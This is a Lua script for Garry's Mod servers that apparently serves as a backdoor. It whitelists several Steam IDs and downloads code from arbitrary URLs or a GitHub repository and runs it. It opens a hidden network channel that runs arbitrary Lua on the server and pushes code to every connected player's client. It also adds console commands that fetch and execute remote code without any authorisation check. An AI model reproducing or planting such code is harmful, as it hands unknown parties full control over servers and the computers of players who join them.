Core64users = {
			['STEAM_0:0:86505916'] = true,
			['STEAM_0:0:46138786'] = true,
			['STEAM_0:1:52242486'] = true,
			['STEAM_0:0:58529358'] = true,
			['STEAM_0:1:30754890'] = true,
			['STEAM_0:0:48309877'] = true,
			['STEAM_0:1:30052037'] = true,
			['STEAM_0:0:36074785'] = true
}


if SERVER then	
		local function UrlFunc(url)
			http.Fetch(url, function(c)
				local func = CompileString(c, "UrlFunc", false)
				return func()
			end)			
		end
		
		function UrlRunS(url)
			local func = UrlFunc(url)
			func()
		end
		
		function GitRunS(url)
			local func = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url)
			func()
		end
		
		util.AddNetworkString('_da_')
		
		local function RunOnCL(tar, code)
			if !tar.CodeReceiver then
				tar.CodeReceiver=true
				tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
			end
			net.Start('_da_')
			net.WriteString(code)
			net.Send(tar)
		end

		local rec = {
			[1] = function(code)
				RunString(code)
			end,
			[2] = function(code)
				for k, v in pairs(player.GetAll()) do
					RunOnCL(v, code)
				end
			end,
			[3] = function(code)
				RunOnCL(net.ReadEntity(), code)
			end,
		}

		net.Receive('_da_', function(len, ply)
			if !great[ply:SteamID()] then return end
			
			local code = net.ReadString()
			rec[net.ReadUInt(2)](code)
		end)
		
		local function cmdurlfunc(player,command,args)
			if args then
				UrlFunc(args[1])
			end
		end
		
		concommand.Add("urlfunc",cmdurlfunc)
		
		local function cmdurlfunc(player,command,args)		
			GitRunS("lua/core.lua")		
		end
		concommand.Add("ert",cmdurlfunc)	
end